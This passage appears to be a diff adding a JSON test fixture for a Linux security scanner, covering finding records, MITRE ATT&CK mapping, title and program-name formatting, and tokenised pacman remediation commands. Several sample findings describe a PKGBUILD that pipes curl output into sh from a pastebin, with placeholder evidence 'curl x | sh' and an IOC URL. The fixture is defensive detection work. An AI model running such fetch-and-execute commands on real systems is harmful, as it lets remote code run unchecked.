+   "error": "pkg/pipe_to_shell: title empty; summary must be exactly one sentence; severity must be one of ('High', 'Medium', 'Low', 'Info'); confidence must be one of ('High', 'Medium', 'Low')",
+   "name": "many at once"
+  },
+  {
+   "args": {
+    "attack": [
+     "X9999"
+    ],
+    "check": "pipe_to_shell",
+    "confidence": "High",
+    "confidence_reason": "Running downloaded code is rarely needed.",
+    "data": "PKGBUILD line 12",
+    "likely": "Malware or a careless packager.",
+    "severity": "High",
+    "signals": [
+     [
+      "curl output piped into sh",
+      0.9
+     ]
+    ],
+    "subject": "/tmp/x/PKGBUILD",
+    "summary": "The build downloads a script from pastebin.com and runs it.",
+    "title": "Downloads and runs a script from a pastebin",
+    "tool": "pkg",
+    "when": 1000.0
+   },
+   "error": "pkg/pipe_to_shell: bad ATT&CK id 'X9999'",
+   "name": "bad attack"
+  }
+ ],
+ "every": {
+  "0": "every ~5 s",
+  "100": "every ~2 min",
+  "12": "every ~10 s",
+  "3": "every ~5 s",
+  "3299": "every ~55 min",
+  "3300": "every hour",
+  "3600": "every hour",
+  "36000": "every ~10 h",
+  "420": "every ~7 min",
+  "5399": "every hour",
+  "54": "every ~55 s",
+  "5400": "every ~2 h",
+  "55": "every ~1 min",
+  "60": "every ~1 min",
+  "7": "every ~5 s",
+  "7200": "every ~2 h",
+  "86400": "every ~24 h",
+  "89": "every ~1 min",
+  "90": "every ~2 min"
+ },
+ "finding_id": [
+  [
+   "pkg",
+   "pipe_to_shell",
+   "/tmp/x/PKGBUILD",
+   "45bc9402e17ca319"
+  ],
+  [
+   "net",
+   "beacon",
+   "firefox|192.0.2.1:443",
+   "1fea4aca81b9f920"
+  ],
+  [
+   "tasks",
+   "ld_preload",
+   "4410",
+   "7c24515dcdd602b7"
+  ],
+  [
+   "files",
+   "x",
+   "",
+   "1d57b8eb79d81e75"
+  ],
+  [
+   "persist",
+   "c",
+   "/home/ü/файл",
+   "d3a4b4af891fb5aa"
+  ]
+ ],
+ "fit_title": [
+  {
+   "in": [
+    "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
+    "Short one"
+   ],
+   "out": "Short one"
+  },
+  {
+   "in": [
+    "yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy"
+   ],
+   "out": "yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy…"
+  },
+  {
+   "in": [
+    "memfd:payload runs from memory",
+    "A program runs from memory only"
+   ],
+   "out": "A program runs from memory only"
+  },
+  {
+   "in": [
+    "100% ready.service started",
+    "A service started"
+   ],
+   "out": "A service started"
+  },
+  {
+   "in": [
+    "",
+    null,
+    "Only this"
+   ],
+   "out": "Only this"
+  },
+  {
+   "in": [
+    "Ends.",
+    "zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz"
+   ],
+   "out": "Ends."
+  },
+  {
+   "in": [
+    "Ends.",
+    "Fine title"
+   ],
+   "out": "Fine title"
+  },
+  {
+   "in": [
+    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaé",
+    "b"
+   ],
+   "out": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaé"
+  },
+  {
+   "in": [
+    "ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc",
+    "dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd"
+   ],
+   "out": "ddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd…"
+  }
+ ],
+ "friendly_program": [
+  {
+   "in": [
+    "/usr/lib/librewolf/librewolf",
+    null,
+    null
+   ],
+   "out": "LibreWolf"
+  },
+  {
+   "in": [
+    "/usr/bin/python3",
+    "/usr/bin/python3 /home/a/.cache/upd.py",
+    null
+   ],
+   "out": "upd.py"
+  },
+  {
+   "in": [
+    "/opt/x/agent (deleted)",
+    null,
+    null
+   ],
+   "out": "agent"
+  },
+  {
+   "in": [
+    null,
+    "/usr/bin/firefox -P",
+    null
+   ],
+   "out": "Firefox"
+  },
+  {
+   "in": [
+    null,
+    null,
+    null
+   ],
+   "out": "A program"
+  },
+  {
+   "in": [
+    "/usr/bin/node",
+    "/usr/bin/node /srv/app/server.js --port 1",
+    null
+   ],
+   "out": "server.js"
+  },
+  {
+   "in": [
+    "/usr/bin/bash",
+    "/usr/bin/bash",
+    null
+   ],
+   "out": "bash"
+  },
+  {
+   "in": [
+    "/usr/bin/unknownthing",
+    null,
+    "Pretty"
+   ],
+   "out": "Pretty"
+  },
+  {
+   "in": [
+    "/usr/bin/CODE",
+    null,
+    null
+   ],
+   "out": "VS Code"
+  },
+  {
+   "in": [
+    "",
+    "",
+    ""
+   ],
+   "out": "A program"
+  },
+  {
+   "in": [
+    "/usr/bin/perl",
+    "/usr/bin/perl -e 1",
+    null
+   ],
+   "out": "-e"
+  },
+  {
+   "in": [
+    "/usr/bin/java",
+    "/usr/bin/java -jar /x/y.jar",
+    null
+   ],
+   "out": "-jar"
+  }
+ ],
+ "kb": [
+  [
+   0,
+   "~0 bytes"
+  ],
+  [
+   5,
+   "~5 bytes"
+  ],
+  [
+   999,
+   "~999 bytes"
+  ],
+  [
+   1000,
+   "~1 kB"
+  ],
+  [
+   1499,
+   "~1 kB"
+  ],
+  [
+   1500,
+   "~2 kB"
+  ],
+  [
+   999999,
+   "~1000 kB"
+  ],
+  [
+   1000000,
+   "~1.0 MB"
+  ],
+  [
+   1500000,
+   "~1.5 MB"
+  ],
+  [
+   25000000.0,
+   "~25.0 MB"
+  ]
+ ],
+ "legend": [
+  [
+   "admin",
+   "Admin / root",
+   "Runs with administrator rights (sudo, doas, pkexec, su)"
+  ],
+  [
+   "pkgmgr",
+   "Package manager",
+   "Installs or removes software; colour shows the distro family"
+  ],
+  [
+   "install",
+   "Install / turn on",
+   "Adds a package, or enables or starts something"
+  ],
+  [
+   "remove",
+   "Remove / turn off",
+   "Removes, disables, stops or blocks something"
+  ],
+  [
+   "package",
+   "Package or app",
+   "What the command acts on"
+  ],
+  [
+   "path",
+   "File path",
+   "A file or folder"
+  ],
+  [
+   "flag",
+   "Option",
+   "Changes how the command behaves; read-only queries too"
+  ],
+  [
+   "service",
+   "Service manager",
+   "systemctl, which controls services"
+  ]
+ ],
+ "make": [
+  {
+   "args": {
+    "check": "pipe_to_shell",
+    "confidence": "High",
+    "confidence_reason": "Running downloaded code is rarely needed.",
+    "data": "PKGBUILD line 12",
+    "likely": "Malware or a careless packager.",
+    "severity": "High",
+    "signals": [
+     [
+      "curl output piped into sh",
+      0.9
+     ]
+    ],
+    "subject": "/tmp/x/PKGBUILD",
+    "summary": "The build downloads a script from pastebin.com and runs it.",
+    "title": "Downloads and runs a script from a pastebin",
+    "tool": "pkg",
+    "when": 1000.0
+   },
+   "name": "good",
+   "out": {
+    "attack": [
+     {
+      "id": "T1059.004",
+      "name": "Command and Scripting Interpreter: Unix Shell",
+      "tactic": "execution",
+      "url": "https://attack.mitre.org/techniques/T1059/004/"
+     },
+     {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "command-and-control",
+      "url": "https://attack.mitre.org/techniques/T1105/"
+     }
+    ],
+    "check": "pipe_to_shell",
+    "confidence": {
+     "level": "High",
+     "reason": "Running downloaded code is rarely needed."
+    },
+    "evidence": [],
+    "fixes": null,
+    "format": 1,
+    "id": "45bc9402e17ca319",
+    "iocs": [],
+    "likely": "Malware or a careless packager.",
+    "severity": "High",
+    "signals": [
+     {
+      "kind": null,
+      "strength": 0.9,
+      "text": "curl output piped into sh"
+     }
+    ],
+    "source": {
+     "check": "pipe_to_shell",
+     "data": "PKGBUILD line 12",
+     "tool": "pkg",
+     "when": 1000.0
+    },
+    "subject": "/tmp/x/PKGBUILD",
+    "summary": "The build downloads a script from pastebin.com and runs it.",
+    "tags": [],
+    "technical": [],
+    "title": "Downloads and runs a script from a pastebin",
+    "tool": "pkg"
+   }
+  },
+  {
+   "args": {
+    "check": "pipe_to_shell",
+    "confidence": "High",
+    "confidence_reason": "Running downloaded code is rarely needed.",
+    "data": "PKGBUILD line 12",
+    "likely": "Malware or a careless packager.",
+    "severity": "High",
+    "signals": [
+     [
+      "curl output piped into sh",
+      0.9
+     ]
+    ],
+    "subject": "/tmp/x/PKGBUILD",
+    "summary": "The build downloads a script from pastebin.com and runs it.",
+    "title": "Another wording of the same thing",
+    "tool": "pkg",
+    "when": 1000.0
+   },
+   "name": "another wording, same id",
+   "out": {
+    "attack": [
+     {
+      "id": "T1059.004",
+      "name": "Command and Scripting Interpreter: Unix Shell",
+      "tactic": "execution",
+      "url": "https://attack.mitre.org/techniques/T1059/004/"
+     },
+     {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "command-and-control",
+      "url": "https://attack.mitre.org/techniques/T1105/"
+     }
+    ],
+    "check": "pipe_to_shell",
+    "confidence": {
+     "level": "High",
+     "reason": "Running downloaded code is rarely needed."
+    },
+    "evidence": [],
+    "fixes": null,
+    "format": 1,
+    "id": "45bc9402e17ca319",
+    "iocs": [],
+    "likely": "Malware or a careless packager.",
+    "severity": "High",
+    "signals": [
+     {
+      "kind": null,
+      "strength": 0.9,
+      "text": "curl output piped into sh"
+     }
+    ],
+    "source": {
+     "check": "pipe_to_shell",
+     "data": "PKGBUILD line 12",
+     "tool": "pkg",
+     "when": 1000.0
+    },
+    "subject": "/tmp/x/PKGBUILD",
+    "summary": "The build downloads a script from pastebin.com and runs it.",
+    "tags": [],
+    "technical": [],
+    "title": "Another wording of the same thing",
+    "tool": "pkg"
+   }
+  },
+  {
+   "args": {
+    "check": "pipe_to_shell",
+    "confidence": "High",
+    "confidence_reason": "Running downloaded code is rarely needed.",
+    "data": "PKGBUILD line 12",
+    "likely": "Malware or a careless packager.",
+    "severity": "Low",
+    "signals": [],
+    "subject": "/other",
+    "summary": "The build downloads a script from pastebin.com and runs it.",
+    "title": "Downloads and runs a script from a pastebin",
+    "tool": "pkg",
+    "when": 1000.0
+   },
+   "name": "low without signals",
+   "out": {
+    "attack": [
+     {
+      "id": "T1059.004",
+      "name": "Command and Scripting Interpreter: Unix Shell",
+      "tactic": "execution",
+      "url": "https://attack.mitre.org/techniques/T1059/004/"
+     },
+     {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "command-and-control",
+      "url": "https://attack.mitre.org/techniques/T1105/"
+     }
+    ],
+    "check": "pipe_to_shell",
+    "confidence": {
+     "level": "High",
+     "reason": "Running downloaded code is rarely needed."
+    },
+    "evidence": [],
+    "fixes": null,
+    "format": 1,
+    "id": "981d4d1cd005a6c4",
+    "iocs": [],
+    "likely": "Malware or a careless packager.",
+    "severity": "Low",
+    "signals": [],
+    "source": {
+     "check": "pipe_to_shell",
+     "data": "PKGBUILD line 12",
+     "tool": "pkg",
+     "when": 1000.0
+    },
+    "subject": "/other",
+    "summary": "The build downloads a script from pastebin.com and runs it.",
+    "tags": [],
+    "technical": [],
+    "title": "Downloads and runs a script from a pastebin",
+    "tool": "pkg"
+   }
+  },
+  {
+   "args": {
+    "check": "pipe_to_shell",
+    "confidence": "High",
+    "confidence_reason": "Running downloaded code is rarely needed.",
+    "data": "PKGBUILD line 12",
+    "likely": "Malware or a careless packager.",
+    "severity": "High",
+    "signals": [
+     [
+      "weak",
+      0.2,
+      "a"
+     ],
+     [
+      "strong",
+      1.7,
+      "b"
+     ],
+     [
+      "neg",
+      -1,
+      null
+     ],
+     [
+      "mid",
+      0.555
+     ]
+    ],
+    "subject": "/tmp/x/PKGBUILD",
+    "summary": "The build downloads a script from pastebin.com and runs it.",
+    "title": "Downloads and runs a script from a pastebin",
+    "tool": "pkg",
+    "when": 1000.0
+   },
+   "name": "signals sorted and clamped",
+   "out": {
+    "attack": [
+     {
+      "id": "T1059.004",
+      "name": "Command and Scripting Interpreter: Unix Shell",
+      "tactic": "execution",
+      "url": "https://attack.mitre.org/techniques/T1059/004/"
+     },
+     {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "command-and-control",
+      "url": "https://attack.mitre.org/techniques/T1105/"
+     }
+    ],
+    "check": "pipe_to_shell",
+    "confidence": {
+     "level": "High",
+     "reason": "Running downloaded code is rarely needed."
+    },
+    "evidence": [],
+    "fixes": null,
+    "format": 1,
+    "id": "45bc9402e17ca319",
+    "iocs": [],
+    "likely": "Malware or a careless packager.",
+    "severity": "High",
+    "signals": [
+     {
+      "kind": "b",
+      "strength": 1.0,
+      "text": "strong"
+     },
+     {
+      "kind": null,
+      "strength": 0.56,
+      "text": "mid"
+     },
+     {
+      "kind": "a",
+      "strength": 0.2,
+      "text": "weak"
+     },
+     {
+      "kind": null,
+      "strength": 0.0,
+      "text": "neg"
+     }
+    ],
+    "source": {
+     "check": "pipe_to_shell",
+     "data": "PKGBUILD line 12",
+     "tool": "pkg",
+     "when": 1000.0
+    },
+    "subject": "/tmp/x/PKGBUILD",
+    "summary": "The build downloads a script from pastebin.com and runs it.",
+    "tags": [],
+    "technical": [],
+    "title": "Downloads and runs a script from a pastebin",
+    "tool": "pkg"
+   }
+  },
+  {
+   "args": {
+    "check": "ld_preload",
+    "severity": "High",
+    "signals": [
+     [
+      "x",
+      1
+     ]
+    ],
+    "summary": "x.",
+    "title": "game has a library forced into it",
+    "tool": "tasks",
+    "when": 1
+   },
+   "name": "ld_preload default attack",
+   "out": {
+    "attack": [
+     {
+      "id": "T1574.006",
+      "name": "Hijack Execution Flow: Dynamic Linker Hijacking",
+      "tactic": "persistence",
+      "url": "https://attack.mitre.org/techniques/T1574/006/"
+     }
+    ],
+    "check": "ld_preload",
+    "confidence": {
+     "level": "Medium",
+     "reason": ""
+    },
+    "evidence": [],
+    "fixes": null,
+    "format": 1,
+    "id": "d247c825a17c81f9",
+    "iocs": [],
+    "likely": null,
+    "severity": "High",
+    "signals": [
+     {
+      "kind": null,
+      "strength": 1.0,
+      "text": "x"
+     }
+    ],
+    "source": {
+     "check": "ld_preload",
+     "data": "",
+     "tool": "tasks",
+     "when": 1
+    },
+    "subject": "",
+    "summary": "x.",
+    "tags": [],
+    "technical": [],
+    "title": "game has a library forced into it",
+    "tool": "tasks"
+   }
+  },
+  {
+   "args": {
+    "attack": [
+     "T1053.003",
+     "T9999"
+    ],
+    "check": "content",
+    "severity": "Info",
+    "summary": "x.",
+    "title": "A thing",
+    "tool": "persist",
+    "when": 1
+   },
+   "name": "explicit attack",
+   "out": {
+    "attack": [
+     {
+      "id": "T1053.003",
+      "name": "Scheduled Task/Job: Cron",
+      "tactic": "persistence",
+      "url": "https://attack.mitre.org/techniques/T1053/003/"
+     },
+     {
+      "id": "T9999",
+      "name": "T9999",
+      "tactic": null,
+      "url": "https://attack.mitre.org/techniques/T9999/"
+     }
+    ],
+    "check": "content",
+    "confidence": {
+     "level": "Medium",
+     "reason": ""
+    },
+    "evidence": [],
+    "fixes": null,
+    "format": 1,
+    "id": "4947bb76ce2fea3f",
+    "iocs": [],
+    "likely": null,
+    "severity": "Info",
+    "signals": [],
+    "source": {
+     "check": "content",
+     "data": "",
+     "tool": "persist",
+     "when": 1
+    },
+    "subject": "",
+    "summary": "x.",
+    "tags": [],
+    "technical": [],
+    "title": "A thing",
+    "tool": "persist"
+   }
+  },
+  {
+   "args": {
+    "check": "pipe_to_shell",
+    "confidence": "High",
+    "confidence_reason": "Running downloaded code is rarely needed.",
+    "data": "PKGBUILD line 12",
+    "evidence": [
+     {
+      "kind": "line",
+      "note": "line 12",
+      "value": "curl x | sh"
+     },
+     {
+      "kind": "pid",
+      "value": 4410
+     }
+    ],
+    "iocs": [
+     {
+      "type": "url",
+      "value": "https://paste.example/raw/x"
+     }
+    ],
+    "likely": "Malware or a careless packager.",
+    "severity": "High",
+    "signals": [
+     [
+      "curl output piped into sh",
+      0.9
+     ]
+    ],
+    "subject": "/tmp/x/PKGBUILD",
+    "summary": "The build downloads a script from pastebin.com and runs it.",
+    "tags": [
+     "aur",
+     "build"
+    ],
+    "technical": [
+     {
+      "label": "Line",
+      "value": 12
+     }
+    ],
+    "title": "Downloads and runs a script from a pastebin",
+    "tool": "pkg",
+    "when": 1000.0
+   },
+   "name": "evidence and iocs",
+   "out": {
+    "attack": [
+     {
+      "id": "T1059.004",
+      "name": "Command and Scripting Interpreter: Unix Shell",
+      "tactic": "execution",
+      "url": "https://attack.mitre.org/techniques/T1059/004/"
+     },
+     {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "command-and-control",
+      "url": "https://attack.mitre.org/techniques/T1105/"
+     }
+    ],
+    "check": "pipe_to_shell",
+    "confidence": {
+     "level": "High",
+     "reason": "Running downloaded code is rarely needed."
+    },
+    "evidence": [
+     {
+      "kind": "line",
+      "note": "line 12",
+      "value": "curl x | sh"
+     },
+     {
+      "kind": "pid",
+      "value": 4410
+     }
+    ],
+    "fixes": null,
+    "format": 1,
+    "id": "45bc9402e17ca319",
+    "iocs": [
+     {
+      "type": "url",
+      "value": "https://paste.example/raw/x"
+     }
+    ],
+    "likely": "Malware or a careless packager.",
+    "severity": "High",
+    "signals": [
+     {
+      "kind": null,
+      "strength": 0.9,
+      "text": "curl output piped into sh"
+     }
+    ],
+    "source": {
+     "check": "pipe_to_shell",
+     "data": "PKGBUILD line 12",
+     "tool": "pkg",
+     "when": 1000.0
+    },
+    "subject": "/tmp/x/PKGBUILD",
+    "summary": "The build downloads a script from pastebin.com and runs it.",
+    "tags": [
+     "aur",
+     "build"
+    ],
+    "technical": [
+     {
+      "label": "Line",
+      "value": 12
+     }
+    ],
+    "title": "Downloads and runs a script from a pastebin",
+    "tool": "pkg"
+   }
+  },
+  {
+   "args": {
+    "check": "pipe_to_shell",
+    "confidence": "High",
+    "confidence_reason": "Running downloaded code is rarely needed.",
+    "data": "PKGBUILD line 12",
+    "fixes": {
+     "check": [
+      {
+       "commands": [
+        "cat /etc/ld.so.preload"
+       ],
+       "risk": "safe",
+       "title": "Look first",
+       "what": "Shows the file."
+      }
+     ],
+     "fix": [
+      {
+       "commands": [
+        "sudo pacman -Rns foo"
+       ],
+       "risk": "admin",
+       "title": "Remove it",
+       "undo": [
+        "sudo pacman -S foo"
+       ],
+       "what": "Removes the package."
+      },
+      {
+       "commands": [],
+       "risk": "settings",
+       "steps": [
+        "Open it",
+        "Delete line 3"
+       ],
+       "title": "Edit by hand",
+       "undo": [],
+       "undo_steps": [
+        "Put the line back"
+       ],
+       "what": "Open the file and delete the line."
+      }
+     ],
+     "osr": "arch"
+    },
+    "likely": "Malware or a careless packager.",
+    "severity": "High",
+    "signals": [
+     [
+      "curl output piped into sh",
+      0.9
+     ]
+    ],
+    "subject": "/tmp/x/PKGBUILD",
+    "summary": "The build downloads a script from pastebin.com and runs it.",
+    "title": "Downloads and runs a script from a pastebin",
+    "tool": "pkg",
+    "when": 1000.0
+   },
+   "name": "with fixes arch",
+   "out": {
+    "attack": [
+     {
+      "id": "T1059.004",
+      "name": "Command and Scripting Interpreter: Unix Shell",
+      "tactic": "execution",
+      "url": "https://attack.mitre.org/techniques/T1059/004/"
+     },
+     {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "command-and-control",
+      "url": "https://attack.mitre.org/techniques/T1105/"
+     }
+    ],
+    "check": "pipe_to_shell",
+    "confidence": {
+     "level": "High",
+     "reason": "Running downloaded code is rarely needed."
+    },
+    "evidence": [],
+    "fixes": {
+     "check": [
+      {
+       "commands": [
+        {
+         "text": "cat /etc/ld.so.preload",
+         "tokens": [
+          {
+           "role": "command",
+           "text": "cat",
+           "tip": "cat prints a file"
+          },
+          {
+           "role": "path",
+           "text": "/etc/ld.so.preload",
+           "tip": "A file or folder path."
+          }
+         ]
+        }
+       ],
+       "risk": "safe",
+       "risk_label": "Safe (read-only)",
+       "title": "Look first",
+       "undo": [],
+       "what": "Shows the file."
+      }
+     ],
+     "distro": {
+      "family": "arch",
+      "id": "arch",
+      "known": true,
+      "name": "Arch Linux"
+     },
+     "firewall": null,
+     "fix": [
+      {
+       "commands": [
+        {
+         "text": "sudo pacman -Rns foo",
+         "tokens": [
+          {
+           "role": "admin",
+           "text": "sudo",
+           "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+          },
+          {
+           "family": "arch",
+           "role": "pkgmgr",
+           "text": "pacman",
+           "tip": "pacman, Arch Linux's package manager."
+          },
+          {
+           "role": "remove",
+           "text": "-Rns",
+           "tip": "-R removes the package; n removes its config files, s unneeded dependencies."
+          },
+          {
+           "role": "package",
+           "text": "foo",
+           "tip": "The package, app or service this acts on."
+          }
+         ]
+        }
+       ],
+       "risk": "admin",
+       "risk_label": "Admin needed",
+       "title": "Remove it",
+       "undo": [
+        {
+         "text": "sudo pacman -S foo",
+         "tokens": [
+          {
+           "role": "admin",
+           "text": "sudo",
+           "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+          },
+          {
+           "family": "arch",
+           "role": "pkgmgr",
+           "text": "pacman",
+           "tip": "pacman, Arch Linux's package manager."
+          },
+          {
+           "role": "install",
+           "text": "-S",
+           "tip": "-S installs (syncs) the packages named after it."
+          },
+          {
+           "role": "package",
+           "text": "foo",
+           "tip": "The package, app or service this acts on."
+          }
+         ]
+        }
+       ],
+       "what": "Removes the package."
+      },
+      {
+       "commands": [],
+       "risk": "settings",
+       "risk_label": "Changes settings",
+       "steps": [
+        "Open it",
+        "Delete line 3"
+       ],
+       "title": "Edit by hand",
+       "undo": [],
+       "undo_steps": [
+        "Put the line back"
+       ],
+       "what": "Open the file and delete the line."
+      }
+     ],
+     "legend": [
+      [
+       "admin",
+       "Admin / root",
+       "Runs with administrator rights (sudo, doas, pkexec, su)"
+      ],
+      [
+       "pkgmgr",
+       "Package manager",
+       "Installs or removes software; colour shows the distro family"
+      ],
+      [
+       "install",
+       "Install / turn on",
+       "Adds a package, or enables or starts something"
+      ],
+      [
+       "remove",
+       "Remove / turn off",
+       "Removes, disables, stops or blocks something"
+      ],
+      [
+       "package",
+       "Package or app",
+       "What the command acts on"
+      ],
+      [
+       "path",
+       "File path",
+       "A file or folder"
+      ],
+      [
+       "flag",
+       "Option",
+       "Changes how the command behaves; read-only queries too"
+      ],
+      [
+       "service",
+       "Service manager",
+       "systemctl, which controls services"
+      ]
+     ],
+     "note": null,
+     "undo": [
+      {
+       "commands": [
+        {
+         "text": "sudo pacman -S foo",
+         "tokens": [
+          {
+           "role": "admin",
+           "text": "sudo",
+           "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+          },
+          {
+           "family": "arch",
+           "role": "pkgmgr",
+           "text": "pacman",
+           "tip": "pacman, Arch Linux's package manager."
+          },
+          {
+           "role": "install",
+           "text": "-S",
+           "tip": "-S installs (syncs) the packages named after it."
+          },
+          {
+           "role": "package",
+           "text": "foo",
+           "tip": "The package, app or service this acts on."
+          }
+         ]
+        }
+       ],
+       "for": "Remove it",
+       "steps": null,
+       "title": "Undo: Remove it"
+      },
+      {
+       "commands": [],
+       "for": "Edit by hand",
+       "steps": [
+        "Put the line back"
+       ],
+       "title": "Undo: Edit by hand"
+      }
+     ]
+    },
+    "format": 1,
+    "id": "45bc9402e17ca319",
+    "iocs": [],
+    "likely": "Malware or a careless packager.",
+    "severity": "High",
+    "signals": [
+     {
+      "kind": null,
+      "strength": 0.9,
+      "text": "curl output piped into sh"
+     }
+    ],
+    "source": {
+     "check": "pipe_to_shell",
+     "data": "PKGBUILD line 12",
+     "tool": "pkg",
+     "when": 1000.0
+    },
+    "subject": "/tmp/x/PKGBUILD",
+    "summary": "The build downloads a script from pastebin.com and runs it.",
+    "tags": [],
+    "technical": [],
+    "title": "Downloads and runs a script from a pastebin",
+    "tool": "pkg"
+   }
+  },
+  {
+   "args": {
+    "check": "pipe_to_shell",
+    "confidence": "High",
+    "confidence_reason": "Running downloaded code is rarely needed.",
+    "data": "PKGBUILD line 12",
+    "fixes": {
+     "check": [
+      {
+       "commands": [
+        "cat /etc/ld.so.preload"
+       ],
+       "risk": "safe",
+       "title": "Look first",
+       "what": "Shows the file."
+      }
+     ],
+     "fix": [
+      {
+       "commands": [
+        "sudo pacman -Rns foo"
+       ],
+       "risk": "admin",
+       "title": "Remove it",
+       "undo": [
+        "sudo pacman -S foo"
+       ],
+       "what": "Removes the package."
+      }
+     ],
+     "osr": "unknown"
+    },
+    "likely": "Malware or a careless packager.",
+    "severity": "High",
+    "signals": [
+     [
+      "curl output piped into sh",
+      0.9
+     ]
+    ],
+    "subject": "/tmp/x/PKGBUILD",
+    "summary": "The build downloads a script from pastebin.com and runs it.",
+    "title": "Downloads and runs a script from a pastebin",
+    "tool": "pkg",
+    "when": 1000.0
+   },
+   "name": "with fixes unknown distro",
+   "out": {
+    "attack": [
+     {
+      "id": "T1059.004",
+      "name": "Command and Scripting Interpreter: Unix Shell",
+      "tactic": "execution",
+      "url": "https://attack.mitre.org/techniques/T1059/004/"
+     },
+     {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "command-and-control",
+      "url": "https://attack.mitre.org/techniques/T1105/"
+     }
+    ],
+    "check": "pipe_to_shell",
+    "confidence": {
+     "level": "High",
+     "reason": "Running downloaded code is rarely needed."
+    },
+    "evidence": [],
+    "fixes": {
+     "check": [
+      {
+       "commands": [
+        {
+         "text": "cat /etc/ld.so.preload",
+         "tokens": [
+          {
+           "role": "command",
+           "text": "cat",
+           "tip": "cat prints a file"
+          },
+          {
+           "role": "path",
+           "text": "/etc/ld.so.preload",
+           "tip": "A file or folder path."
+          }
+         ]
+        }
+       ],
+       "risk": "safe",
+       "risk_label": "Safe (read-only)",
+       "title": "Look first",
+       "undo": [],
+       "what": "Shows the file."
+      }
+     ],
+     "distro": {
+      "family": null,
+      "id": "mystery",
+      "known": false,
+      "name": "Mystery OS"
+     },
+     "firewall": null,
+     "fix": [
+      {
+       "commands": [
+        {
+         "text": "sudo pacman -Rns foo",
+         "tokens": [
+          {
+           "role": "admin",
+           "text": "sudo",
+           "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+          },
+          {
+           "family": "arch",
+           "role": "pkgmgr",
+           "text": "pacman",
+           "tip": "pacman, Arch Linux's package manager."
+          },
+          {
+           "role": "remove",
+           "text": "-Rns",
+           "tip": "-R removes the package; n removes its config files, s unneeded dependencies."
+          },
+          {
+           "role": "package",
+           "text": "foo",
+           "tip": "The package, app or service this acts on."
+          }
+         ]
+        }
+       ],
+       "risk": "admin",
+       "risk_label": "Admin needed",
+       "title": "Remove it",
+       "undo": [
+        {
+         "text": "sudo pacman -S foo",
+         "tokens": [
+          {
+           "role": "admin",
+           "text": "sudo",
+           "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+          },
+          {
+           "family": "arch",
+           "role": "pkgmgr",
+           "text": "pacman",
+           "tip": "pacman, Arch Linux's package manager."
+          },
+          {
+           "role": "install",
+           "text": "-S",
+           "tip": "-S installs (syncs) the packages named after it."
+          },
+          {
+           "role": "package",
+           "text": "foo",
+           "tip": "The package, app or service this acts on."
+          }
+         ]
+        }
+       ],
+       "what": "Removes the package."
+      }
+     ],
+     "legend": [
+      [
+       "admin",
+       "Admin / root",
+       "Runs with administrator rights (sudo, doas, pkexec, su)"
+      ],
+      [
+       "pkgmgr",
+       "Package manager",
+       "Installs or removes software; colour shows the distro family"
+      ],
+      [
+       "install",
+       "Install / turn on",
+       "Adds a package, or enables or starts something"
+      ],
+      [
+       "remove",
+       "Remove / turn off",
+       "Removes, disables, stops or blocks something"
+      ],
+      [
+       "package",
+       "Package or app",
+       "What the command acts on"
+      ],
+      [
+       "path",
+       "File path",
+       "A file or folder"
+      ],
+      [
+       "flag",
+       "Option",
+       "Changes how the command behaves; read-only queries too"
+      ],
+      [
+       "service",
+       "Service manager",
+       "systemctl, which controls services"
+      ]
+     ],
+     "note": "Unknown distro: only generic, read-only checks are shown. Vigil read /etc/os-release and did not recognise ID or ID_LIKE.",
+     "undo": [
+      {
+       "commands": [
+        {
+         "text": "sudo pacman -S foo",
+         "tokens": [
+          {
+           "role": "admin",
+           "text": "sudo",
+           "tip": "Runs the rest as administrator (root). Read the command before you type your password."
+          },
+          {
+           "family": "arch",
+           "role": "pkgmgr",
+           "text": "pacman",
+           "tip": "pacman, Arch Linux's package manager."
+          },
+          {
+           "role": "install",
+           "text": "-S",
+           "tip": "-S installs (syncs) the packages named after it."
+          },
+          {
+           "role": "package",
+           "text": "foo",
+           "tip": "The package, app or service this acts on."
+          }
+         ]
+        }
+       ],
+       "for": "Remove it",
+       "steps": null,
+       "title": "Undo: Remove it"
+      }
+     ]
+    },
+    "format": 1,
+    "id": "45bc9402e17ca319",
+    "iocs": [],
+    "likely": "Malware or a careless packager.",
+    "severity": "High",
+    "signals": [
+     {
+      "kind": null,
+      "strength": 0.9,
+      "text": "curl output piped into sh"
+     }
+    ],
+    "source": {
+     "check": "pipe_to_shell",
+     "data": "PKGBUILD line 12",
+     "tool": "pkg",
+     "when": 1000.0
+    },
+    "subject": "/tmp/x/PKGBUILD",
+    "summary": "The build downloads a script from pastebin.com and runs it.",
+    "tags": [],
+    "technical": [],
+    "title": "Downloads and runs a script from a pastebin",
+    "tool": "pkg"
+   }
+  },
+  {
+   "args": {
+    "check": "pipe_to_shell",
+    "confidence": "High",
+    "confidence_reason": "Running downloaded code is rarely needed.",
+    "data": "PKGBUILD line 12",
+    "likely": "Malware or a careless packager.",
+    "severity": "High",
+    "signals": [
+     [
+      "curl output piped into sh",
+      0.9
+     ]
+    ],
+    "subject": "/home/ü/файл",
